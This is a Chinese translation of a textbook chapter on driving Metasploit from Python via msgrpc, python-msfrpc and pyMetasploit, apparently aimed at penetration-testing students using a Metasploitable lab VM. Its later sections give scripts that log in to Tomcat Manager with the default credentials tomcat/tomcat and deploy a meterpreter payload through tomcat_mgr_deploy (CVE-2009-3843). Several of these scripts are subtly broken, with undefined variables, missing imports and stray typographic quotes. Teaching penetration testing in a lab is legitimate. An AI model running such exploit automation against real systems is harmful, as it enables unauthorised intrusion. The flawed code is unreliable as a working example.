# 与Metasploit框架连接

本章涵盖了Metasploit框架作为利用漏洞的工具，以及如何使用Python中的`Python-msfprc`和`pyMetasploit`模块进行编程。这些模块帮助我们在Python和Metasploit的msgrpc之间进行交互，以自动执行Metasploit框架中的模块和利用。

本章将涵盖以下主题：

+   Metasploit框架作为利用漏洞的工具

+   `msfconsole`作为与Metasploit Framework交互的命令控制台界面

+   将Metasploit连接到`python-msfrpc`模块

+   将Metasploit连接到`pyMetasploit`模块

# 技术要求

本章的示例和源代码可在GitHub存储库的`chapter9`文件夹中找到：[https://github.com/PacktPublishing/Mastering-Python-for-Networking-and-Security](https://github.com/PacktPublishing/Mastering-Python-for-Networking-and-Security)[.](https://github.com/PacktPublishing/Mastering-Python-for-Networking-and-Security)

您需要在本地机器上安装至少4GB内存的Python发行版。在本章中，我们将使用一个虚拟机进行一些与端口分析和漏洞检测相关的测试。可以从sourceforge页面下载：[https://sourceforge.net/projects/Metasploitable/files/Metasploitable2](https://sourceforge.net/projects/metasploitable/files/Metasploitable2)。

要登录，您必须使用msfadmin作为用户名和密码：

![](assets/fd4a5855-2f1e-4aee-b971-2e4dfdcc22e0.png)

Metasploitable是由Metasploit组创建的虚拟机，其中包含Ubuntu 8.04系统的镜像，故意配置不安全和存在漏洞的服务，可以使用Metasploit Framework进行利用。这个虚拟机旨在练习Metasploit提供的多种选项，对于在受控环境中执行测试非常有帮助。

# 介绍Metasploit框架

在本节中，我们将回顾Metasploit作为当今最常用的工具之一，它允许对服务器进行攻击和利用漏洞，以进行渗透测试。

# 介绍利用

利用阶段是获得对系统控制的过程。这个过程可以采取许多不同的形式，但最终目标始终是相同的：获得对袭击计算机的管理员级访问权限。

利用是最自由执行的阶段，因为每个系统都是不同和独特的。根据情况，攻击向量因目标不同而异，因为不同的操作系统、不同的服务和不同的进程需要不同类型的攻击。熟练的攻击者必须了解他们打算利用的每个系统的细微差别，最终他们将能够执行自己的利用。

# Metasploit框架

Metasploit是执行真实攻击和利用漏洞的框架。基本上，我们需要启动服务器并连接到Metasploit控制台。对于每个需要执行的命令，我们需要创建一个控制台会话来执行利用。

Metasploit框架允许外部应用程序使用工具本身集成的模块和利用。为此，它提供了一个插件服务，我们可以在执行Metasploit的机器上构建，并通过API执行不同的模块。为此，有必要了解Metasploit Framework API（Metasploit远程API），可在[https://community.rapid7.com/docs/DOC-1516](https://community.rapid7.com/docs/DOC-1516)上找到。

# Metasploit架构

Metasploit架构的主要组件是由Rex、framework-core和framework-base组成的库。架构的其他组件是接口、自定义插件、协议工具、模块和安全工具。包括的模块有利用、有效载荷、编码器、NOPS和辅助。

在这个图表中，我们可以看到主要的模块和Metasploit架构：

![](assets/6bb099b4-0910-4d68-b08b-c9b60fdc3711.png)

Metasploit架构的主要模块是：

+   Rex: 大多数框架执行的任务的基本库。它负责处理诸如连接到网站（例如，当我们在网站中搜索敏感文件时）、套接字（负责从我们的计算机到SSH服务器的连接，例如）和许多与SSL和Base64相关的类似实用程序的事情。

+   MSF :: Core: 它总体上定义了框架的功能（模块、利用和有效载荷的工作方式）

+   MSF :: Base: 与MSF :: Core类似工作，主要区别在于它对开发人员更友好和简化。

+   插件: 扩展框架功能的工具，例如，它们允许我们集成第三方工具，如Sqlmap、OpenVas和Nexpose。

+   工具: 通常有用的几个工具（例如，“list_interfaces”显示我们的网络接口的信息，“virustotal”通过virustotal.com数据库检查任何文件是否感染）。

+   接口: 我们可以使用Metasploit的所有接口。控制台版本、Web版本、GUI版本（图形用户界面）和CLI，Metasploit控制台的一个版本。

+   模块: 包含所有利用、有效载荷、编码器、辅助、nops和post的文件夹。

+   利用: 利用特定软件中的一个或多个漏洞的程序；通常用于获取对系统的访问权限并对其进行控制。

+   有效载荷: 一种程序（或“恶意”代码），它伴随利用一起在利用成功后执行特定功能。选择一个好的有效载荷是一个非常重要的决定，当涉及到利用和维持在系统中获得的访问级别时。在许多系统中，有防火墙、防病毒软件和入侵检测系统，可能会阻碍一些有效载荷的活动。因此，通常使用编码器来尝试规避任何防病毒软件或防火墙。

+   编码器: 提供编码和混淆我们在利用成功后将使用的有效载荷的算法。

+   Aux: 允许与漏洞扫描器和嗅探器等工具进行交互。为了获取关于目标的必要信息，以确定可能影响它的漏洞，这种类型的工具对于在目标系统上建立攻击策略或在安全官员的情况下定义防御措施以减轻对易受攻击系统的威胁是有用的。

+   Nops: 一条汇编语言指令，除了增加程序的计数器外，不做任何事情。

除了这里描述的工作模块，Metasploit框架还有四种不同的用户界面：msfconsole（Metasploit框架控制台）、msfcli（Metasploit框架客户端）、msfgui（Metasploit框架图形界面）和msfweb（Metasploit框架的服务器和Web界面）。

接下来的部分将重点放在**Metasploit框架控制台界面**上，尽管使用任何其他界面都可以提供相同的结果。

# 与Metasploit框架交互

在这一部分，我们将介绍与Metasploit框架交互的`msfconsole`，展示获取利用和有效载荷模块的主要命令。

# msfconsole简介

`Msfconsole`是我们可以用来与模块交互和执行利用的工具。这个工具默认安装在Kali linux发行版中：

![](assets/75680b5c-eee1-4119-a6fa-8b33019f2fe8.png)

# 介绍Metasploit利用模块

如前面在“介绍Metasploit框架”部分中所解释的，利用是允许攻击者利用易受攻击的系统并破坏其安全性的代码，这可能是操作系统或其中安装的一些软件中的漏洞。

Metasploit的`exploit`模块是Metasploit中的基本模块，用于封装一个利用，用户可以使用单个利用来针对许多平台。该模块带有简化的元信息字段。

在Metasploit框架中，有大量的利用默认情况下已经存在，可以用于进行渗透测试。

要查看Metasploit的利用，可以在使用该工具时使用`show exploits`命令：

![](assets/d1c475e6-f4b2-4c5e-8981-c9f99820ac7d.png)

在Metasploit框架中利用系统的五个步骤是：

1.  配置活动利用

1.  验证利用选项

1.  选择目标

1.  选择负载

1.  启动利用

# 介绍Metasploit负载模块

`负载`是在系统中被攻破后运行的代码，主要用于在攻击者的机器和受害者的机器之间建立连接。负载主要用于执行命令，以便访问远程机器。

在Metasploit框架中，有一组可以在利用或`辅助`模块中使用和加载的负载。

要查看可用内容，请使用`show payloads`命令：

![](assets/3c5c2a69-00f7-4121-a894-835e30f8e332.png)

在Metasploit环境中可用的有**generic/shell_bind_tcp**和**generic/shell_reverse_tcp**，两者都通过提供一个shell与受害者的机器建立连接，从而为攻击者提供用户界面以访问操作系统资源。它们之间的唯一区别是，在第一种情况下，连接是从攻击者的机器到受害者的机器，而在第二种情况下，连接是从受害者的机器建立的，这要求攻击者的机器有一个监听以检测该连接的程序。

**反向shell**在检测到目标机器的防火墙或IDS阻止传入连接时最有用。有关何时使用反向shell的更多信息，请查看[https://github.com/rapid7/Metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-a-reverse-shell-in-Metasploit)。

此外，我们还可以找到其他负载，如**meterpreter/bind_tcp**和**meterpreter/reverse_tcp**，它们提供一个meterpreter会话；它们与shell相关的负载的区别相同，即它们的连接建立方式不同。

# 介绍msgrpc

第一步是使用`msgrpc`插件启动服务器的实例。为此，您可以从`msfconsole`加载模块，或直接使用`msfrpcd`命令。首先，您需要加载`msfconsole`并启动`msgrpc`服务：

```py
./msfconsole

msfconsole msf exploit(handler) > load msgrpc User = msf Pass = password
[*] MSGRPC Service: 127.0.0.1:55553
[*] MSGRPC Username: user
[*] MSGRPC Password: password
[*] Successfully loaded plugin: msgrpc msf exploit(handler) >
```

通过这种方式，我们加载进程以响应来自另一台机器的请求：

```py
./msfrpcd -h

Usage: msfrpcd <options>
OPTIONS:
-P <opt> Specify the password to access msfrpcd
-S Disable SSL on the RPC socket
-U <opt> Specify the username to access msfrpcd
-a <opt> Bind to this IP address
-f Run the daemon in the foreground
-h Help banner
-n Disable database
-p <opt> Bind to this port instead of 55553
-u <opt> URI for web server
```

通过这个命令，我们可以执行连接到msfconsole的进程，参数是`username`（`-U`），`password`（`-P`）和`port`（`-p`）监听服务的端口：

```py
./msfrpcd -U msf -P password -p 55553 -n -f
```

通过这种方式，Metasploit的RPC接口正在端口55553上监听。我们可以从Python脚本与诸如`python-msfrpc`和`pyMetasploit`之类的模块进行交互。与MSGRPC的交互几乎与与msfconsole的交互相似。

该服务器旨在作为守护程序运行，允许多个用户进行身份验证并执行特定的Metasploit框架命令。在上面的示例中，我们使用`msf`作为名称和密码作为密码，在端口55553上启动我们的`msfrpcd`服务器。

# 连接Metasploit框架和Python

在本节中，我们将介绍Metasploit以及如何将该框架与Python集成。Metasploit用于开发模块的编程语言是Ruby，但是使用Python也可以利用此框架的好处，这要归功于诸如`python-msfrpc`之类的库。

# MessagePack简介

在开始解释此模块的操作之前，了解MSGRPC接口使用的MessagePack格式是很方便的。

MessagePack是一种专门用于序列化信息的格式，它允许消息更紧凑，以便在不同机器之间快速传输信息。它的工作方式类似于JSON；但是，由于数据是使用MessagePack格式进行序列化，因此消息中的字节数大大减少。

要在Python中安装`msgpack`库，只需从MessagePack网站下载软件包，并使用安装参数运行`setup.py`脚本。我们还可以使用`pip install msgpack-python`命令进行安装。

有关此格式的更多信息，请查询官方网站：[http://msgpack.org](http://msgpack.org)

在此屏幕截图中，我们可以看到支持此工具的API和语言：

![](assets/2f56099e-531a-4621-8398-a2f110cb2dc6.png)

Metasploit框架允许外部应用程序通过使用MSGRPC插件来使用模块和利用。此插件在本地机器上引发RPC服务器的一个实例，因此可以从网络中的任何点利用Metasploit框架提供的所有功能。该服务器的操作基于使用MessagePack格式对消息进行序列化，因此需要使用此格式的Python实现，这可以通过使用`msgpack`库来实现。

另一方面，`python-msfrpc`库负责封装与MSGRPC服务器和使用msgpack的客户端交换包的所有细节。通过这种方式，可以在任何Python脚本和msgrpc接口之间进行交互。

# 安装python-msfrpc

您可以从[github.com/SpiderLabs/msfrpc](http://github.com/SpiderLabs/msfrpc)存储库安装`python-msfrpc`库，并使用安装选项执行`setup.py`脚本：[https://github.com/SpiderLabs/msfrpc/tree/master/python-msfrpc](https://github.com/SpiderLabs/msfrpc/tree/master/python-msfrpc)。

该模块旨在允许与Metasploit msgrpc插件进行交互，以允许远程执行Metasploit命令和脚本。

要验证这两个库是否已正确安装，请使用Python解释器导入每个主要模块，并验证是否没有错误。

您可以在Python解释器中执行以下命令来验证安装：

![](assets/478bdb6a-75e0-46a8-853e-f1df4ec12f62.png)

安装msfrpc的另一种选择是从SpiderLabs GitHub存储库获取`msfrpc Python`模块的最新版本，并使用`setup.py`脚本：

```py
git clone git://github.com/SpiderLabs/msfrpc.git msfrpc
cd msfrpc/python-msfrpc
python setup.py install
```

现在服务正在运行并等待来自客户端的连接，从Python脚本中，我们可以直接使用`msfrpc`库进行连接。我们的下一步是编写我们的代码来**连接到Metasploit**，并与系统进行身份验证：

```py
import msfrpc

# Create a new instance of the Msfrpc client with the default options
client = msfrpc.Msfrpc({'port':55553})

# Login to the msfmsg server
client.login(user,password)
```

要与Metasploit服务器进行交互，需要了解允许远程控制Metasploit框架实例的API，也称为Metasploit远程API。该规范包含与MSGRPC服务器进行交互所需的功能，并描述了社区版本框架的用户可以实现的功能。

官方指南可在[https://Metasploit.help.rapid7.com/docs/rpc-api](https://metasploit.help.rapid7.com/docs/rpc-api)和[https://Metasploit.help.rapid7.com/docs/sample-usage-of-the-rpc-api](https://metasploit.help.rapid7.com/docs/sample-usage-of-the-rpc-api)找到。

以下脚本显示了一种实际示例，说明了在经过身份验证后如何与服务器进行交互。在主机参数中，您可以使用localhost，如果Metasploit实例在本地机器上运行，则可以使用`127.0.0.1`，或者您可以指定远程地址。如您所见，使用`call`函数允许我们指示要执行的函数及其相应的参数。

您可以在`msfrpc_connect.py`文件中的`msfrpc`文件夹中找到以下代码：

```py
import msfrpc

client = msfrpc.Msfrpc({'uri':'/msfrpc', 'port':'5553', 'host':'127.0.0.1', 'ssl': True})
auth = client.login('msf','password')
    if auth:
        print str(client.call('core.version'))+'\n'
        print str(client.call('core.thread_list', []))+'\n'
        print str(client.call('job.list', []))+'\n'
        print str(client.call('module.exploits', []))+'\n'
        print str(client.call('module.auxiliary', []))+'\n'
        print str(client.call('module.post', []))+'\n'
        print str(client.call('module.payloads', []))+'\n'
        print str(client.call('module.encoders', []))+'\n'
        print str(client.call('module.nops', []))+'\n'
```

在上一个脚本中，使用了API中可用的几个函数，这些函数允许我们建立配置值并获取exploits和`auxiliary`模块。

也可以以通常使用msfconsole实用程序的方式与框架进行交互，只需要使用`console.create`函数创建控制台的实例，然后使用该函数返回的控制台标识符。

要创建一个新的控制台，请将以下代码添加到脚本中：

```py
try:        
    res = client.call('console.create')        
    console_id = res['id']
except:        
    print "Console create failed\r\n"        
    sys.exit()
```

# 执行API调用

`call`方法允许我们从Metasploit内部调用通过msgrpc接口公开的API元素。对于第一个示例，我们将请求从服务器获取所有exploits的列表。为此，我们调用`module.exploits`函数：

`＃从服务器获取exploits列表`

`mod = client.call('module.exploits')`

如果我们想找到所有兼容的有效载荷，我们可以调用`module.compatible_payloads`方法来查找与我们的exploit兼容的有效载荷：

＃获取第一个选项的兼容有效载荷列表

`ret = client.call('module.compatible_payloads',[mod['modules'][0]])`

在此示例中，我们正在获取此信息并获取第一个选项的兼容有效载荷列表。

您可以在`msfrpc_get_exploits.py`文件中的`msfrpc`文件夹中找到以下代码：

```py
import msfrpc

username='msf'
password=’password’

# Create a new instance of the Msfrpc client with the default options
client = msfrpc.Msfrpc({'port':55553})

# Login in Metasploit server
client.login(username,password)

# Get a list of the exploits from the server
exploits = client.call('module.exploits')

# Get the list of compatible payloads for the first option
payloads= client.call('module.compatible_payloads',[mod['modules'][0]])
for i in (payloads.get('payloads')):
    print("\t%s" % i)
```

我们还有命令可以在Metasploit控制台中启动会话。为此，我们使用调用函数传递`console.create`命令作为参数，然后我们可以在该控制台上执行命令。命令可以从控制台或文件中读取。在这个例子中，我们正在从文件中获取命令，并且对于每个命令，我们在创建的控制台中执行它。

您可以在`msfrpc_create_console.py`文件中的`msfrpc`文件夹中找到以下代码：

```py
# -*- encoding: utf-8 -*-
import msfrpc
import time

client = msfrpc.Msfrpc({'uri':'/msfrpc', 'port':'5553', 'host':'127.0.0.1', 'ssl': True})
auth = client.login('msf','password')

if auth:

    console = client.call('console.create')
    #read commands from the file commands_file.txt
    file = open ("commands_file.txt", 'r')
    commands = file.readlines()
    file.close()

    # Execute each of the commands that appear in the file
    print(len(commands))
    for command in commands:
        resource = client.call('console.write',[console['id'], command])
        processData(console['id'])
```

此外，我们需要一种方法来检查控制台是否准备好获取更多信息，或者是否有错误被打印回给我们。我们可以使用我们的`processData`方法来实现这一点。我们可以定义一个函数来读取执行命令的输出并显示结果：

```py
def processData(consoleId):
    while True:
        readedData = self.client.call('console.read',[consoleId])
        print(readedData['data'])
        if len(readedData['data']) > 1:
            print(readedData['data'])
        if readedData[‘busy’] == True:
            time.sleep(1)
            continue
        break
```

# 利用Metasploit的Tomcat服务

在**Metasploitable**虚拟机环境中安装了一个Apache Tomcat服务，该服务容易受到远程攻击者的多种攻击。第一种攻击可以是暴力破解，从一个单词列表开始，尝试捕获Tomcat应用程序管理器的访问凭据（Tomcat应用程序管理器允许我们查看和管理服务器中安装的应用程序）。如果执行此模块成功，它将提供有效的用户名和密码以访问服务器。

在Metasploit Framework中，有一个名为`tomcat_mgr_login`的`auxiliary`模块，如果执行成功，将为攻击者提供访问Tomcat Manager的用户名和密码。

使用`info`命令，我们可以看到执行模块所需的选项：

![](assets/75336c52-cfbe-460a-bda4-8b0feac20533.png)

在此屏幕截图中，我们可以看到需要设置的参数以执行模块：

![](assets/acf10566-11b0-48e4-b3f2-17c66da734e4.png)

一旦选择了`auxiliary/scanner/http/tomcat_mgr_login`模块，就需要根据您想要进行的分析深度来配置参数，例如`STOP_ON_SUCCESS = true`，`RHOSTS = 192.168.100.2`，`RPORT = 8180`，`USER_FILE`和`USERPASS_FILE`；然后执行。

执行后，**结果是用户名为tomcat，密码也是tomcat**，再次显示了弱用户名和密码的漏洞。有了这个结果，您可以访问服务器并上传文件：

![](assets/4a65241a-5e9b-4b5f-9f2d-5cb30831aab1.png)

# 使用tomcat_mgr_deploy利用。

Tomcat可能受到的另一种攻击是名为Apache Tomcat Manager Application Deployer Authenticated Code Execution的利用。此利用与Tomcat中的一个漏洞相关，被标识为CVE-2009-3843，严重程度很高（10）。此漏洞允许在服务器上执行先前加载为.war文件的有效负载。为了执行该利用，需要通过`auxiliary`模块或其他途径获得用户及其密码。该利用位于`multi/http/tomcat_mgr_deploy`路径中。

在`msf>`命令行中输入：`use exploit/multi/http/tomcat_mgr_deploy`

一旦加载了利用，您可以输入`show payloads`和`show options`来配置工具：

![](assets/f58f0ef7-5cf9-47b8-a8b0-192fe0f44c01.png)

通过**show options**，我们可以看到执行模块所需的参数：

![](assets/807d2b1d-38d9-4190-b6b2-05a56953a20b.png)

要使用它，执行`exploit/multi/http/tomcat_mgr_deploy`命令。配置必要的参数：`RPORT = 8180, RHOST = 192.168.100.2, USERNAME = tomcat, PASSWORD = tomcat`，选择`java/meterpreter/bind_tcp`有效负载，建立一个meterpreter会话并执行利用。

成功执行利用后，通过`meterpreter`命令解释器建立了连接，提供了一系列有用的选项，以在受攻击的系统内部提升权限。

一旦启动，shell将回拨其主机并允许其以被利用服务的任何权限输入命令。我们将使用Java有效负载来实现MSF中的功能。

在下一个脚本中，我们正在自动化这个过程，设置参数和有效负载，并使用exploit选项执行模块。

`RHOST`和`RPORT`参数可以通过`optparse`模块在命令行中给出。

您可以在`msfrpc`文件夹中的`exploit_tomcat.py`文件中找到以下代码：

```py
import msfrpc
import time

def exploit(RHOST, RPORT):
    client = msfrpc.Msfrpc({})
    client.login('msf', 'password')
    ress = client.call('console.create')
    console_id = ress['id']

    ## Exploit TOMCAT MANAGER ##
    commands = """use exploit/multi/http/tomcat_mgr_deploy
    set PATH /manager
    set HttpUsername tomcat
    set HttpPassword tomcat
    set RHOST """+RHOST+"""
    set RPORT """+RPORT+"""
    set payload java/meterpreter/bind_tcp
    exploit
    """

    print("[+] Exploiting TOMCAT MANAGER on: "+RHOST)
    client.call('console.write',[console_id,commands])
    res = client.call('console.read',[console_id])
    result = res['data'].split('n')

def main():
    parser = optparse.OptionParser(sys.argv[0] +' -h RHOST -p LPORT')parser.add_option('-h', dest='RHOST', type='string', help='Specify a remote host')
    parser.add_option('-p', dest='LPORT', type='string', help ='specify a port to listen ')
    (options, args) = parser.parse_args()
    RHOST=options.RHOST
    LPORT=options.LPORT

    if (RHOST == None) and (RPORT == None):
        print parser.usage
        sys.exit(0)

    exploit(RHOST, RPORT)

if __name__ == "__main__":
    main()
```

# 将Metasploit与pyMetasploit连接

在本节中，我们将回顾Metasploit以及如何将此框架与Python集成。Metasploit中用于开发模块的编程语言是ruby，但是使用Python也可以利用诸如**pyMetasploit**之类的库来利用此框架的好处。

# PyMetasploit简介

PyMetasploit是Python的`msfrpc`库，允许我们使用Python自动化利用任务。它旨在与最新版本的Metasploit一起提供的msfrpcd守护程序进行交互。因此，在您开始使用此库之前，您需要初始化msfrpcd并且（强烈建议）初始化PostgreSQL：[https://github.com/allfro/pyMetasploit](https://github.com/allfro/pymetasploit)。

我们可以使用`setup.py`脚本安装从源代码安装模块：

```py
$ git clone https://github.com/allfro/pyMetasploit.git $ cd pyMetasploit
$ python setup.py install
```

安装完成后，我们可以在脚本中导入模块并与`MsfRpcClient`类建立连接：

```py
>>> from Metasploit.msfrpc import MsfRpcClient
>>> client = MsfRpcClient('password',user='msf')
```

# 从Python与Metasploit框架进行交互

**MsfRpcClient**类提供了浏览Metasploit框架的核心功能。

与Metasploit框架一样，MsfRpcClient分为不同的管理模块：

+   **auth：** 管理msfrpcd守护程序的客户端身份验证。

+   **consoles：** 管理由Metasploit模块创建的控制台/Shell的交互。

+   **core：** 管理Metasploit框架核心。

+   **db：** 管理msfrpcd的后端数据库连接。

+   **模块：** 管理Metasploit模块（如exploits和auxiliaries）的交互和配置。

+   **plugins：** 管理与Metasploit核心关联的插件。

+   **sessions：** 管理与Metasploit meterpreter会话的交互。

就像Metasploit控制台一样，您可以检索所有可用的模块编码器、有效载荷和exploits的列表：

```py
>>> client.modules.auxiliary
 >>> client.modules.encoders
 >>> client.modules.payloads
 >>> client.modules.post
```

这将列出exploit模块：

`exploits = client.modules.exploits`

我们可以使用`use`方法激活其中一个exploit：

`scan = client.modules.use('exploits', 'multi/http/tomcat_mgr_deploy')`

与`python-msfprc`一样，使用此模块，我们还可以连接到控制台并像在msfconsole中那样运行命令。我们可以通过两种方式实现这一点。第一种是在激活exploit后使用scan对象。第二种是使用console对象以与msfconsole交互时相同的方式执行命令。

您可以在`pyMetasploit`文件夹中的`exploit_tomcat_maanger.py`文件中找到以下代码：

```py
from Metasploit.msfrpc import MsfRpcClient
from Metasploit.msfconsole import MsfRpcConsole

client = MsfRpcClient('password', user='msf')

exploits = client.modules.exploits
for exploit in exploits:
    print("\t%s" % exploit)

scan = client.modules.use('exploits', 'multi/http/tomcat_mgr_deploy')
scan.description
scan.required
scan['RHOST'] = '192.168.100.2'
scan['RPORT'] = '8180'
scan['PATH'] = '/manager'
scan['HttpUsername'] = 'tomcat'
scan['HttpPassword'] = 'tomcat'
scan['payload'] = 'java/meterpreter/bind_tcp'
print(scan.execute())

console = MsfRpcConsole(client)
console.execute('use exploit/multi/http/tomcat_mgr_deploy')
console.execute('set RHOST 192.168.100.2')
console.execute('set RPORT 8180')
console.execute('set PATH /manager')
console.execute('set HttpUsername tomcat')
console.execute('set HttpPassword tomcat')
console.execute('set payload java/meterpreter/bind_tcp')
console.execute('run')
```

# 总结

本章的一个目标是了解Metasploit框架作为利用漏洞的工具，以及如何在Python中与Metasploit控制台进行程序化交互。使用诸如Python-msfrpc和pyMetasploit之类的模块，可以自动执行在Metasploit框架中找到的模块和exploits。

在下一章中，我们将探讨在Metasploitable虚拟机中发现的漏洞，以及如何连接到漏洞扫描器（如`nessus`和`nexpose`）以从Python模块中提取这些漏洞。

# 问题

1.  在Metasploit中与模块进行交互和执行exploits的接口是什么？

1.  使用Metasploit框架利用系统的主要步骤是什么？

1.  使用Metasploit框架在客户端和Metasploit服务器实例之间交换信息的接口名称是什么？

1.  `generic/shell_bind_tcp`和`generic/shell_reverse_tcp`之间有什么区别？

1.  我们可以执行哪个命令来连接到msfconsole？

1.  我们需要使用哪个函数以与msfconsole实用程序相同的方式与框架进行交互？

1.  使用Metasploit框架在客户端和Metasploit服务器实例之间交换信息的远程访问接口名称是什么？

1.  我们如何可以获得Metasploit服务器上所有exploits的列表？

1.  在Metasploit框架中，哪些模块可以访问tomcat中的应用程序管理器并利用apache tomcat服务器以获取会话meterpreter？

1.  当在tomcat服务器中执行漏洞利用时，建立meterpreter会话的有效负载名称是什么？

# 进一步阅读

在这些链接中，您将找到有关诸如kali linux和Metasploit框架的工具的更多信息，以及我们用于脚本执行的Metasploitable虚拟机的官方文档：

+   [https://docs.kali.org/general-use/starting-Metasploit-framework-in-kali](https://docs.kali.org/general-use/starting-Metasploit-framework-in-kali)

+   [https://github.com/rapid7/Metasploit-framework](https://github.com/rapid7/Metasploit-framework)

+   [https://information.rapid7.com/Metasploit-framework.html](https://information.rapid7.com/Metasploit-framework.html)

自动漏洞利用程序：此工具使用子进程模块与Metasploit框架控制台进行交互，并自动化了一些您可以在msfconsole中找到的漏洞利用：[https://github.com/anilbaranyelken/arpag](https://github.com/anilbaranyelken/arpag)。
